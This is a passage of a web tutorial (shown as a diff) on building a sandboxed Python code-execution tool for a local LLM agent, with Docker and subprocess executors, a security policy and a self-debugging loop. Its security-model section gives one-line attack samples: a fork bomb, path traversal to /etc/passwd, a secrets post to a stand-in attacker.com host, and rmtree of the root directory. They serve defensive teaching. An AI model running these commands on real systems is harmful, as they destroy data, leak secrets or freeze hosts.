+          <li><code>--cpus=0.5</code> — limits CPU to half a core</li>
+          <li><code>--network=none</code> — removes all network access, blocking exfiltration</li>
+          <li><code>--read-only</code> — makes the root filesystem read-only; only the mounted <code>/workspace</code> is writable</li>
+          <li><code>-v /tmp/sandbox:/workspace:rw</code> — a scratch directory for file I/O between host and container</li>
+          <li><code>--rm</code> — auto-removes the container after exit</li>
+        </ul>
+
+        <h3>Approach 3 — E2B cloud sandbox (bonus)</h3>
+        <p><a href="https://e2b.dev" target="_blank" rel="noopener">E2B</a> provides a managed sandbox API. You push code via their SDK; they run it in an isolated cloud VM and return stdout/stderr. No Docker setup required, and it works on any OS including Windows. The free tier allows 100 executions/hour.</p>
+
+        <div class="code-block-wrapper">
+          <div class="code-tabs" role="tablist" aria-label="E2B install command">
+            <button class="code-tab active" role="tab" aria-selected="true" onclick="switchTab(this,'e2b-py')">Python</button>
+            <button class="code-tab" role="tab" aria-selected="false" onclick="switchTab(this,'e2b-ts')">TypeScript</button>
+          </div>
+          <div class="code-panel active" id="e2b-py">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-bash">pip install e2b-code-interpreter</code></pre>
+          </div>
+          <div class="code-panel" id="e2b-ts">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-bash">npm install @e2b/code-interpreter</code></pre>
+          </div>
+        </div>
+
+        <div class="bridge">
+          You now know the three options. For the rest of this module we'll implement both <strong>subprocess</strong> (for quick iteration) and <strong>Docker</strong> (for the production hands-on lab), and wire them up as identical tool interfaces so you can swap between them with a single line change.
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION 3: SECURITY MODEL -->
+      <!-- ============================================================ -->
+      <section class="section" id="security-model">
+        <h2>Security Model</h2>
+
+        <p>Before you write a single line of executor code, you need to know what you're defending against. Here are the five real attack vectors that happen in production code-execution agents:</p>
+
+        <ul>
+          <li><strong><span class="term-tooltip" tabindex="0" aria-describedby="tt-pathtrav">Path traversal<span class="tooltip-content" role="tooltip" id="tt-pathtrav">Code that walks up the directory tree using "../../../" to escape the intended working directory and read or overwrite sensitive files like /etc/passwd or ~/.aws/credentials.</span></span></strong> — <code>open("../../../../etc/passwd")</code></li>
+          <li><strong>Infinite loops</strong> — <code>while True: pass</code> consuming 100% CPU indefinitely</li>
+          <li><strong><span class="term-tooltip" tabindex="0" aria-describedby="tt-forkbomb">Fork bombs<span class="tooltip-content" role="tooltip" id="tt-forkbomb">Code that spawns exponentially increasing child processes, rapidly exhausting the OS process table and making the host unresponsive. Classic example: :(){ :|:& };: in bash, or os.fork() called recursively in Python.</span></span></strong> — rapidly spawning processes until the OS freezes</li>
+          <li><strong>Network exfiltration</strong> — <code>import requests; requests.post("attacker.com", data=secrets)</code></li>
+          <li><strong>Filesystem damage</strong> — <code>import shutil; shutil.rmtree("/")</code></li>
+        </ul>
+
+        <div class="callout-security">
+          <span class="box-label">Security Reality Check</span>
+          If your agent accepts code from end users (or generates code based on user-controlled input), treat every execution like untrusted input, regardless of how well-behaved your system prompt is. Models can be jailbroken, and even a well-intentioned model can generate dangerous code from an ambiguous prompt. The Docker flags above are not optional.
+        </div>
+
+        <p>Here's the <code>SecurityPolicy</code> dataclass that encapsulates every configurable limit. Pass it to any executor — it's the same interface whether you're using subprocess or Docker:</p>
+
+        <div class="code-block-wrapper">
+          <div class="code-tabs" role="tablist" aria-label="SecurityPolicy dataclass">
+            <button class="code-tab active" role="tab" aria-selected="true" onclick="switchTab(this,'secpol-py')">Python</button>
+            <button class="code-tab" role="tab" aria-selected="false" onclick="switchTab(this,'secpol-ts')">TypeScript</button>
+          </div>
+          <div class="code-panel active" id="secpol-py">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-python">from dataclasses import dataclass, field
+
+@dataclass
+class SecurityPolicy:
+    """All configurable security limits for one code execution."""
+    # === WHAT: Hard cap on wall-clock seconds the process may run.
+    # WHY: Prevents infinite loops from hanging your agent forever.
+    # GOTCHA: Set this shorter than your HTTP timeout so you get a
+    #         clean TimeoutError instead of a gateway 504.
+    timeout_seconds: int = 10
+
+    # === WHAT: Max bytes the process may allocate on the heap.
+    # WHY: Prevents memory bombs from killing the host process.
+    # GOTCHA: resource.setrlimit is Linux/macOS only.
+    #         On Windows use Docker --memory= instead.
+    max_memory_bytes: int = 128 * 1024 * 1024  # 128 MB
+
+    # === WHAT: Docker CPU share (fraction of one core).
+    # WHY: Prevents one sandbox from starving other containers.
+    # GOTCHA: Values above 1.0 span multiple cores.
+    max_cpus: float = 0.5
+
+    # === WHAT: Whether to block all network I/O.
+    # WHY: Prevents code from exfiltrating secrets or calling home.
+    # GOTCHA: If code needs to fetch a URL (e.g., for scraping),
+    #         set to False and use an egress proxy with allowlists.
+    network_disabled: bool = True
+
+    # === WHAT: Whether the container root filesystem is read-only.
+    # WHY: Prevents writing outside the /workspace scratch dir.
+    readonly_filesystem: bool = True
+
+    # === WHAT: Docker image to run code in.
+    # WHY: Pins the Python version and available packages.
+    # GOTCHA: Always use a specific tag, never :latest.
+    docker_image: str = "python:3.12-alpine"
+
+    # === WHAT: Packages pre-installed in the container.
+    # WHY: Alpine has no pip packages by default; list what you need.
+    allowed_packages: list = field(default_factory=lambda: ["pandas", "numpy"])
+</code></pre>
+          </div>
+          <div class="code-panel" id="secpol-ts">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-typescript">// === WHAT: All configurable security limits for one code execution.
+// WHY: Centralizing policy in one object lets you swap profiles
+//      (dev vs prod vs untrusted) without touching executor logic.
+interface SecurityPolicy {
+  // Hard cap on wall-clock seconds the process may run.
+  timeoutSeconds: number;      // default: 10
+  // Max bytes the process may allocate.
+  maxMemoryBytes: number;      // default: 128 * 1024 * 1024
+  // Docker CPU fraction.
+  maxCpus: number;             // default: 0.5
+  // Block all network I/O.
+  networkDisabled: boolean;    // default: true
+  // Container root filesystem is read-only.
+  readonlyFilesystem: boolean; // default: true
+  // Docker image tag (always pin a version).
+  dockerImage: string;         // default: "python:3.12-alpine"
+  // Packages to pip install before running code.
+  allowedPackages: string[];   // default: ["pandas","numpy"]
+}
+
+const DEFAULT_POLICY: SecurityPolicy = {
+  timeoutSeconds: 10,
+  maxMemoryBytes: 128 * 1024 * 1024,
+  maxCpus: 0.5,
+  networkDisabled: true,
+  readonlyFilesystem: true,
+  dockerImage: "python:3.12-alpine",
+  allowedPackages: ["pandas", "numpy"],
+};
+</code></pre>
+          </div>
+        </div>
+
+        <!-- Animation 1: Security Layers -->
+        <div class="animation-container" aria-label="Animated diagram showing security policy layers blocking attack vectors one by one">
+          <div class="animation-title">Animation: Security Policy Layers &mdash; Attacks Blocked One by One</div>
+          <div class="sec-wrap" id="secAnim">
+            <div class="sec-ring sec-ring-3" id="sec-r3"></div>
+            <div class="sec-ring sec-ring-2" id="sec-r2"></div>
+            <div class="sec-ring sec-ring-1" id="sec-r1"></div>
+            <div class="sec-center" id="sec-core">
+              <span>&#128274;</span>
+              <span>Sandbox</span>
+              <span style="font-size:0.5rem;color:var(--text-muted)" id="sec-status">unprotected</span>
+            </div>
+            <!-- Attacks around the center -->
+            <div class="sec-attack" id="sec-a1" style="top:8%;left:5%"><span class="atk-icon">&#9851;</span>infinite loop</div>
+            <div class="sec-attack" id="sec-a2" style="top:8%;right:5%"><span class="atk-icon">&#128121;</span>fork bomb</div>
+            <div class="sec-attack" id="sec-a3" style="bottom:15%;left:5%"><span class="atk-icon">&#128269;</span>path traversal</div>
+            <div class="sec-attack" id="sec-a4" style="bottom:15%;right:5%"><span class="atk-icon">&#128246;</span>exfiltration</div>
+            <div class="sec-attack" id="sec-a5" style="bottom:5%;left:50%;transform:translateX(-50%)"><span class="atk-icon">&#128465;</span>rm -rf /</div>
+            <!-- Defense labels -->
+            <div class="sec-label" id="sec-l1" style="top:calc(50% - 95px);left:50%;transform:translateX(-50%)">timeout + CPU limit</div>
+            <div class="sec-label" id="sec-l2" style="top:calc(50% - 125px);left:50%;transform:translateX(-50%)">--network=none + read-only FS</div>
+            <div class="sec-label" id="sec-l3" style="top:calc(50% - 158px);left:50%;transform:translateX(-50%)">ephemeral container (--rm)</div>
+          </div>
+          <div class="animation-controls">
+            <button class="anim-btn" onclick="secPlay()" aria-label="Play security animation" title="Play">&#9654;</button>
+            <button class="anim-btn" onclick="secPause()" aria-label="Pause security animation" title="Pause">&#9646;&#9646;</button>
+            <button class="anim-btn" onclick="secReset()" aria-label="Restart security animation" title="Restart">&#8635;</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION 4: IMPLEMENTING THE TOOL -->
+      <!-- ============================================================ -->
+      <section class="section" id="implementing-tool">
+        <h2>Implementing the <code>execute_python</code> Tool</h2>
+
+        <p>The tool definition the model sees is the same regardless of which executor backs it. Here is the JSON schema you pass to the model:</p>
+
+        <div class="code-block-wrapper">
+          <div class="code-tabs" role="tablist" aria-label="Tool definition JSON schema">
+            <button class="code-tab active" role="tab" aria-selected="true" onclick="switchTab(this,'tooldef-py')">Python</button>
+            <button class="code-tab" role="tab" aria-selected="false" onclick="switchTab(this,'tooldef-ts')">TypeScript</button>
+          </div>
+          <div class="code-panel active" id="tooldef-py">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-python"># === WHAT: Tool schema passed to Ollama/Mistral via the OpenAI SDK.
+# WHY: The model uses the description to decide when to call this
+#      tool and the parameter schema to know what to send.
+# GOTCHA: Keep the description concrete. "Runs Python" is vague.
+#         Tell the model what it gets back (stdout, stderr, exit code).
+
+EXECUTE_PYTHON_TOOL = {
+    "type": "function",
+    "function": {
+        "name": "execute_python",
+        "description": (
+            "Run Python code in a sandboxed environment. "
+            "Returns stdout (the printed output), stderr (any errors), "
+            "and exit_code (0 = success, non-zero = failure). "
+            "Use this for math, data analysis, file I/O, and any task "
+            "that requires deterministic computation."
+        ),
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "code": {
+                    "type": "string",
+                    "description": "Complete Python source code to execute.",
+                },
+                "timeout_seconds": {
+                    "type": "integer",
+                    "description": "Max seconds before the execution is killed. Default: 10.",
+                    "default": 10,
+                },
+            },
+            "required": ["code"],
+        },
+    },
+}
+</code></pre>
+          </div>
+          <div class="code-panel" id="tooldef-ts">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-typescript">// === WHAT: Tool schema passed to Ollama/Mistral via the OpenAI SDK.
+// WHY: The model uses the description to decide when to call this
+//      tool. The parameter schema enforces the shape of its output.
+// GOTCHA: Mistral is more literal than GPT-4 about descriptions.
+//         Spell out what the return value looks like.
+
+const EXECUTE_PYTHON_TOOL = {
+  type: "function" as const,
+  function: {
+    name: "execute_python",
+    description:
+      "Run Python code in a sandboxed environment. " +
+      "Returns stdout (printed output), stderr (any errors), " +
+      "and exit_code (0 = success, non-zero = failure). " +
+      "Use this for math, data analysis, file I/O, and any task " +
+      "that requires deterministic computation.",
+    parameters: {
+      type: "object",
+      properties: {
+        code: {
+          type: "string",
+          description: "Complete Python source code to execute.",
+        },
+        timeout_seconds: {
+          type: "integer",
+          description: "Max seconds before the execution is killed. Default: 10.",
+          default: 10,
+        },
+      },
+      required: ["code"],
+    },
+  },
+};
+</code></pre>
+          </div>
+        </div>
+
+        <h3>SubprocessExecutor — Fast, Low Overhead</h3>
+
+        <div class="code-annotation">
+          <span class="ann-label">Chunk 1 of 3 — WHAT</span>
+          Write code to a temp file, run it with a timeout. <strong>GOTCHA:</strong> never pass <code>shell=True</code> — it exposes you to shell injection even if the code itself looks safe.
+        </div>
+
+        <div class="code-block-wrapper">
+          <div class="code-tabs" role="tablist" aria-label="SubprocessExecutor implementation">
+            <button class="code-tab active" role="tab" aria-selected="true" onclick="switchTab(this,'subproc-py')">Python</button>
+            <button class="code-tab" role="tab" aria-selected="false" onclick="switchTab(this,'subproc-ts')">TypeScript</button>
+          </div>
+          <div class="code-panel active" id="subproc-py">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-python">import subprocess
+import sys
+import tempfile
+import os
+from dataclasses import dataclass
+
+@dataclass
+class ExecResult:
+    stdout: str
+    stderr: str
+    exit_code: int
+
+    def to_tool_content(self) -> str:
+        """Format the result as a concise tool message for the model."""
+        lines = [f"exit_code: {self.exit_code}"]
+        if self.stdout:
+            lines.append(f"stdout:\n{self.stdout.strip()}")
+        if self.stderr:
+            lines.append(f"stderr:\n{self.stderr.strip()}")
+        return "\n".join(lines)
+
+
+class SubprocessExecutor:
+    """
+    === WHAT: Runs Python code in a child process.
+    === WHY: Zero Docker overhead; ideal for dev/trusted code.
+    === GOTCHA: Full filesystem access. Don't use for user input.
+    """
+
+    def __init__(self, policy: "SecurityPolicy | None" = None):
+        from dataclasses import dataclass, field
+
+        if policy is None:
+            # Use a safe default
+            @dataclass
+            class _Policy:
+                timeout_seconds: int = 10
+                max_memory_bytes: int = 128 * 1024 * 1024
+            policy = _Policy()
+        self.policy = policy
+
+    def run(self, code: str, timeout: int | None = None) -> ExecResult:
+        timeout = timeout or self.policy.timeout_seconds
+
+        # === CHUNK 2: Write code to a temp file.
+        # WHY: exec(code) in-process would pollute our namespace.
+        #      A temp file gives the child its own scope.
+        # GOTCHA: delete=False so the child can open it after we close it.
+        with tempfile.NamedTemporaryFile(
+            mode="w", suffix=".py", delete=False, encoding="utf-8"
+        ) as f:
+            f.write(code)
+            tmp_path = f.name
+
+        try:
+            # === CHUNK 3: Launch child process.
+            # WHY: shell=False prevents shell-injection attacks.
+            # GOTCHA: On Linux, add preexec_fn=set_limits() to apply
+            #         resource.setrlimit for CPU/memory limits.
+            result = subprocess.run(
+                [sys.executable, tmp_path],
+                capture_output=True,
+                text=True,
+                timeout=timeout,
+                shell=False,    # CRITICAL: never True
+            )
+            return ExecResult(
+                stdout=result.stdout,
+                stderr=result.stderr,
+                exit_code=result.returncode,
+            )
+        except subprocess.TimeoutExpired:
+            return ExecResult(
+                stdout="",
+                stderr=f"Execution timed out after {timeout} seconds.",
+                exit_code=124,  # same convention as bash timeout(1)
+            )
+        except Exception as e:
+            return ExecResult(stdout="", stderr=str(e), exit_code=1)
+        finally:
+            # Clean up the temp file regardless of outcome.
+            os.unlink(tmp_path)
+</code></pre>
+          </div>
+          <div class="code-panel" id="subproc-ts">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-typescript">import { execFile } from "child_process";
+import { writeFile, unlink } from "fs/promises";
+import { tmpdir } from "os";
+import { join } from "path";
+import { promisify } from "util";
+
+const execFileAsync = promisify(execFile);
+
+interface ExecResult {
+  stdout: string;
+  stderr: string;
+  exitCode: number;
+}
+
+function toToolContent(r: ExecResult): string {
+  const parts = [`exit_code: ${r.exitCode}`];
+  if (r.stdout) parts.push(`stdout:\n${r.stdout.trim()}`);
+  if (r.stderr) parts.push(`stderr:\n${r.stderr.trim()}`);
+  return parts.join("\n");
+}
+
+// === WHAT: Runs Python code in a child process via Node's child_process.
+// === WHY: No Docker required; fast startup; ideal for trusted code.
+// === GOTCHA: shell: false is the default for execFile — keep it that way.
+class SubprocessExecutor {
+  private timeoutMs: number;
+
+  constructor(timeoutSeconds = 10) {
+    this.timeoutMs = timeoutSeconds * 1000;
+  }
+
+  async run(code: string, timeoutSeconds?: number): Promise<ExecResult> {
+    const timeout = (timeoutSeconds ?? 10) * 1000;
+    // Write code to a temp file so the child gets its own scope.
+    const tmpFile = join(tmpdir(), `sandbox_${Date.now()}.py`);
+    await writeFile(tmpFile, code, "utf-8");
+    try {
+      // execFile with shell:false (default) avoids shell injection.
+      const { stdout, stderr } = await execFileAsync(
+        "python3",
+        [tmpFile],
+        { timeout, encoding: "utf8" }
+      );
+      return { stdout, stderr, exitCode: 0 };
+    } catch (err: any) {
+      if (err.killed || err.signal === "SIGTERM") {
+        return {
+          stdout: "",
+          stderr: `Execution timed out after ${timeoutSeconds ?? 10}s.`,
+          exitCode: 124,
+        };
+      }
+      return {
+        stdout: err.stdout ?? "",
+        stderr: err.stderr ?? String(err),
+        exitCode: err.code ?? 1,
+      };
+    } finally {
+      await unlink(tmpFile).catch(() => {});
+    }
+  }
+}
+</code></pre>
+          </div>
+        </div>
+
+        <h3>DockerExecutor — Production-Ready</h3>
+
+        <div class="code-annotation">
+          <span class="ann-label">Architecture Note</span>
+          DockerExecutor writes code to a host temp directory, mounts it into the container at <code>/workspace</code>, then runs <code>python /workspace/code.py</code>. The host temp directory is the <em>only</em> writable surface shared between host and container. Everything else is isolated.
+        </div>
+
+        <div class="code-block-wrapper">
+          <div class="code-tabs" role="tablist" aria-label="DockerExecutor implementation">
+            <button class="code-tab active" role="tab" aria-selected="true" onclick="switchTab(this,'docker-py')">Python</button>
+            <button class="code-tab" role="tab" aria-selected="false" onclick="switchTab(this,'docker-ts')">TypeScript</button>
+          </div>
+          <div class="code-panel active" id="docker-py">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-python">import subprocess
+import tempfile
+import os
+import uuid
+from pathlib import Path
+
+
+class DockerExecutor:
+    """
+    === WHAT: Runs Python code inside an ephemeral Docker container.
+    === WHY: Full OS-level isolation; safe for untrusted/user-provided code.
+    === GOTCHA: Requires Docker to be running. First execution may be slow
+                while the image is pulled (~30 s for python:3.12-alpine).
+                Subsequent runs reuse the cached image (~1–2 s cold start).
+    """
+
+    def __init__(self, policy: "SecurityPolicy | None" = None):
+        from dataclasses import dataclass, field
+
+        if policy is None:
+            @dataclass
+            class _P:
+                timeout_seconds: int = 10
+                max_memory_bytes: int = 128 * 1024 * 1024
+                max_cpus: float = 0.5
+                network_disabled: bool = True
+                readonly_filesystem: bool = True
+                docker_image: str = "python:3.12-alpine"
+                allowed_packages: list = field(default_factory=lambda: ["pandas", "numpy"])
+            policy = _P()
+        self.policy = policy
+        self._pre_build_image()
+
+    def _pre_build_image(self):
+        """
+        === WHAT: Pre-install required packages into a custom image once.
+        === WHY: Installing packages at runtime (pip install inside the run
+                 command) adds 10–30 s per execution. Build once, reuse many.
+        === GOTCHA: This builds a local image tagged 'sandbox-agent:latest'.
+                    Re-run if you change allowed_packages.
+        """
+        if not self.policy.allowed_packages:
+            return
+        pkgs = " ".join(self.policy.allowed_packages)
+        dockerfile = f"""FROM {self.policy.docker_image}
+RUN pip install --no-cache-dir {pkgs}
+WORKDIR /workspace
+"""
+        with tempfile.TemporaryDirectory() as ctx:
+            df_path = Path(ctx) / "Dockerfile"
+            df_path.write_text(dockerfile)
+            subprocess.run(
+                ["docker", "build", "-t", "sandbox-agent:latest", ctx],
+                check=True,
+                capture_output=True,
+            )
+
+    def run(self, code: str, timeout: int | None = None) -> "ExecResult":
+        timeout = timeout or self.policy.timeout_seconds
+        run_id = uuid.uuid4().hex[:8]
+
+        # === CHUNK 1: Write code to a host temp directory.
+        # WHY: We'll mount this directory into the container as /workspace.
+        # GOTCHA: Use a unique sub-dir per call so parallel runs don't clash.
+        host_dir = Path(tempfile.mkdtemp(prefix=f"sandbox_{run_id}_"))
+        code_file = host_dir / "code.py"
+        code_file.write_text(code, encoding="utf-8")
+
+        try:
+            # === CHUNK 2: Build the docker run command with all security flags.
+            # WHY: Each flag maps directly to one of our SecurityPolicy fields.
+            # GOTCHA: --rm removes the container after exit automatically.
+            cmd = [
+                "docker", "run", "--rm",
+                f"--memory={self.policy.max_memory_bytes}",
+                f"--cpus={self.policy.max_cpus}",
+                f"--volume={host_dir}:/workspace:rw",
+                "--workdir=/workspace",
+            ]
+            if self.policy.network_disabled:
+                cmd.append("--network=none")
+            if self.policy.readonly_filesystem:
+                cmd.append("--read-only")
+                cmd.extend(["--tmpfs=/tmp"])    # allow /tmp writes for stdlib
+
+            cmd += ["sandbox-agent:latest", "python", "/workspace/code.py"]
+
+            # === CHUNK 3: Run the container and capture output.
+            # WHY: timeout here is the wall-clock limit for the whole container.
+            # GOTCHA: If Docker itself fails to start, CalledProcessError is
+            #         raised before the user code even runs — check stderr first.
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=timeout + 5,    # give Docker 5 s overhead on top
+            )
+            return ExecResult(
+                stdout=result.stdout,
+                stderr=result.stderr,
+                exit_code=result.returncode,
+            )
+        except subprocess.TimeoutExpired:
+            # Kill any leftover container matching our run_id label.
+            subprocess.run(
+                ["docker", "kill", f"sandbox_{run_id}"],
+                capture_output=True
+            )
+            return ExecResult(
+                stdout="",
+                stderr=f"Docker execution timed out after {timeout}s.",
+                exit_code=124,
+            )
+        except FileNotFoundError:
+            return ExecResult(
+                stdout="",
+                stderr="Docker not found. Is Docker Desktop running?",
+                exit_code=127,
+            )
+        except Exception as e:
+            return ExecResult(stdout="", stderr=str(e), exit_code=1)
+        finally:
+            import shutil
+            shutil.rmtree(host_dir, ignore_errors=True)
+</code></pre>
+          </div>
+          <div class="code-panel" id="docker-ts">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-typescript">import { execFile, execFileSync } from "child_process";
+import { writeFile, rm, mkdir } from "fs/promises";
+import { tmpdir } from "os";
+import { join } from "path";
+import { promisify } from "util";
+import { randomBytes } from "crypto";
+
+const execFileAsync = promisify(execFile);
+
+// === WHAT: Runs Python code in an ephemeral Docker container.
+// === WHY: Full OS isolation; safe for user-provided code.
+// === GOTCHA: Requires Docker running locally. First call may
+//             pull the alpine image (~30 s); cached after that.
+class DockerExecutor {
+  private policy: Required<SecurityPolicy>;
+  private imageBuilt = false;
+
+  constructor(policy?: Partial<SecurityPolicy>) {
+    this.policy = { ...DEFAULT_POLICY, ...policy };
+  }
+
+  private buildImage() {
+    if (this.imageBuilt || !this.policy.allowedPackages.length) {
+      this.imageBuilt = true;
+      return;
+    }
+    const pkgs = this.policy.allowedPackages.join(" ");
+    const dockerfile = [
+      `FROM ${this.policy.dockerImage}`,
+      `RUN pip install --no-cache-dir ${pkgs}`,
+      "WORKDIR /workspace",
+    ].join("\n");
+
+    // Write Dockerfile to a temp dir and build.
+    const ctx = join(tmpdir(), "sandbox_build");
+    require("fs").mkdirSync(ctx, { recursive: true });
+    require("fs").writeFileSync(join(ctx, "Dockerfile"), dockerfile);
+    execFileSync("docker", ["build", "-t", "sandbox-agent:latest", ctx]);
+    this.imageBuilt = true;
+  }
+
+  async run(code: string, timeoutSeconds?: number): Promise<ExecResult> {
+    this.buildImage();
+    const timeout = (timeoutSeconds ?? this.policy.timeoutSeconds) * 1000;
+    const runId = randomBytes(4).toString("hex");
+
+    // Write code to a host temp directory that we'll mount.
+    const hostDir = join(tmpdir(), `sandbox_${runId}`);
+    await mkdir(hostDir, { recursive: true });
+    await writeFile(join(hostDir, "code.py"), code, "utf-8");
+
+    try {
+      // Build docker run command with all security flags.
+      const cmd: string[] = [
+        "run", "--rm",
+        `--memory=${this.policy.maxMemoryBytes}`,
+        `--cpus=${this.policy.maxCpus}`,
+        `--volume=${hostDir}:/workspace:rw`,
+        "--workdir=/workspace",
+      ];
+      if (this.policy.networkDisabled) cmd.push("--network=none");
+      if (this.policy.readonlyFilesystem) {
+        cmd.push("--read-only");
+        cmd.push("--tmpfs=/tmp");
+      }
+      cmd.push("sandbox-agent:latest", "python", "/workspace/code.py");
+
+      const { stdout, stderr } = await execFileAsync("docker", cmd, {
+        timeout: timeout + 5000,
+        encoding: "utf8",
+      });
+      return { stdout, stderr, exitCode: 0 };
+    } catch (err: any) {
+      if (err.killed || err.code === "ETIMEDOUT") {
+        return {
+          stdout: "",
+          stderr: `Docker execution timed out after ${timeoutSeconds ?? this.policy.timeoutSeconds}s.`,
+          exitCode: 124,
+        };
+      }
+      if (err.code === "ENOENT") {
+        return {
+          stdout: "",
+          stderr: "Docker not found. Is Docker Desktop running?",
+          exitCode: 127,
+        };
+      }
+      return {
+        stdout: err.stdout ?? "",
+        stderr: err.stderr ?? String(err),
+        exitCode: err.code ?? 1,
+      };
+    } finally {
+      await rm(hostDir, { recursive: true, force: true });
+    }
+  }
+}
+</code></pre>
+          </div>
+        </div>
+
+        <div class="checkpoint">
+          <div class="checkpoint-label">What Just Happened?</div>
+          <p style="margin-bottom:0;">You now have two executor classes with identical <code>run(code, timeout) -&gt; ExecResult</code> signatures. <code>SubprocessExecutor</code> is fast but trusting; <code>DockerExecutor</code> is slower to cold-start but fully isolated. Both return the same <code>ExecResult</code> so you can swap executors without touching the agent code. Next: wire one of them up as the tool handler inside the agent loop.</p>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION 5: SELF-DEBUGGING LOOP -->
+      <!-- ============================================================ -->
+      <section class="section" id="self-debugging">
+        <h2>Self-Debugging Loop</h2>
+
+        <p>Here's the magic: when the executor returns a non-zero exit code, you append the stdout and stderr to the message history and let the model try again. The model reads its own error message, diagnoses the problem, and rewrites the code. This is a full <strong>ReAct loop</strong> for code generation:</p>
+
+        <ol>
+          <li>Model generates Python code and calls <code>execute_python</code></li>
+          <li>Agent extracts the code and runs it via the executor</li>
+          <li>If <code>exit_code != 0</code>: append the <code>tool</code> result (with the error) back to messages, ask model to retry</li>
+          <li>Repeat up to <strong>3 attempts</strong> before returning a final error to the caller</li>
+          <li>On <code>exit_code == 0</code>: return the final stdout as the agent's answer</li>
+        </ol>
+
+        <!-- Animation 2: Self-Debugging State Machine -->
+        <div class="animation-container" aria-label="Animated state machine showing the self-debugging loop: write code, run, read error, fix, retry">
+          <div class="animation-title">Animation: Self-Debugging State Machine</div>
+          <div class="dbg-wrap" id="dbgAnim">
+            <div class="dbg-attempt-counter" id="dbg-counter">attempt: 0/3</div>
+            <div class="dbg-state" id="dbg-s0"><span class="dbg-badge write">WRITE</span><span class="dbg-text">Model generates code: <code>df['revenue'].sum()</code></span></div>
+            <div class="dbg-arrow" id="dbg-ar0">&#8595;</div>
+            <div class="dbg-state" id="dbg-s1"><span class="dbg-badge run">RUN</span><span class="dbg-text">execute_python called &rarr; subprocess/Docker</span></div>
+            <div class="dbg-arrow" id="dbg-ar1">&#8595;</div>
+            <div class="dbg-state error-state" id="dbg-s2"><span class="dbg-badge err">ERROR</span><span class="dbg-text">exit_code=1 &nbsp;&#9642;&nbsp; stderr: NameError: name 'df' is not defined</span></div>
+            <div class="dbg-arrow" id="dbg-ar2">&#8595; append error to messages, retry</div>
+            <div class="dbg-state" id="dbg-s3"><span class="dbg-badge fix">FIX</span><span class="dbg-text">Model reads error, rewrites: adds <code>import pandas as pd; df = pd.read_csv(...)</code></span></div>
+            <div class="dbg-arrow" id="dbg-ar3">&#8595;</div>
+            <div class="dbg-state" id="dbg-s4"><span class="dbg-badge run">RUN</span><span class="dbg-text">execute_python called again (attempt 2/3)</span></div>
+            <div class="dbg-arrow" id="dbg-ar4">&#8595;</div>
+            <div class="dbg-state success-state" id="dbg-s5"><span class="dbg-badge ok">OK</span><span class="dbg-text">exit_code=0 &nbsp;&#9642;&nbsp; stdout: 94250.75 &nbsp;&#9745; Return to user</span></div>
+          </div>
+          <div class="animation-controls">
+            <button class="anim-btn" onclick="dbgPlay()" aria-label="Play debug loop animation" title="Play">&#9654;</button>
+            <button class="anim-btn" onclick="dbgPause()" aria-label="Pause debug loop animation" title="Pause">&#9646;&#9646;</button>
+            <button class="anim-btn" onclick="dbgReset()" aria-label="Restart debug loop animation" title="Restart">&#8635;</button>
+          </div>
+        </div>
+
+        <p>Here is the complete <code>CodeExecutionAgent</code> class — the full production implementation:</p>
+
+        <div class="code-annotation">
+          <span class="ann-label">Chunk 1 — Setup</span>
+          Initialize the OpenAI client pointed at Ollama, the executor, and the tool definition. <strong>GOTCHA:</strong> Mistral models vary in tool-use reliability. <code>mistral-nemo</code> and <code>mistral-small</code> are the most reliable for structured tool calls locally.
+        </div>
+
+        <div class="code-block-wrapper">
+          <div class="code-tabs" role="tablist" aria-label="CodeExecutionAgent full implementation">
+            <button class="code-tab active" role="tab" aria-selected="true" onclick="switchTab(this,'agent-py')">Python</button>
+            <button class="code-tab" role="tab" aria-selected="false" onclick="switchTab(this,'agent-ts')">TypeScript</button>
+          </div>
+          <div class="code-panel active" id="agent-py">
+            <button class="copy-btn" aria-label="Copy code to clipboard" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-python">import json
+from openai import OpenAI
+
+# === WHAT: OpenAI SDK pointed at local Ollama.
+# WHY: Mistral's API surface is identical to OpenAI's when served
+#      by Ollama, so we reuse the well-supported openai library.
+# GOTCHA: api_key can be any non-empty string; Ollama ignores it.
+client = OpenAI(
+    base_url="http://localhost:11434/v1",
+    api_key="ollama",
+)
+
+class CodeExecutionAgent:
+    """
+    ReAct-style agent that writes Python code, runs it, and
+    self-debugs up to max_retries times on failure.
+    """
+
+    def __init__(
+        self,
+        executor=None,
+        model: str = "mistral-nemo",
+        max_retries: int = 3,
+    ):
+        # === CHUNK 2: Executor defaults to SubprocessExecutor for dev.
+        # WHY: Let callers inject DockerExecutor for production without
+        #      changing this class.
+        self.executor = executor or SubprocessExecutor()
+        self.model = model
+        self.max_retries = max_retries
+        self.system_prompt = (
+            "You are a data analysis assistant. When asked to compute "
+            "something, write complete Python code and call execute_python. "
+            "Always import every module you use. Print your final answer "
+            "so it appears in stdout. If you receive an error, read it "
+            "carefully, fix the code, and call execute_python again."
+        )
+
+    def run(self, user_request: str) -> str:
+        """Run the agent, return the final answer string."""
+        messages = [
+            {"role": "system", "content": self.system_prompt},
+            {"role": "user",   "content": user_request},
+        ]
+
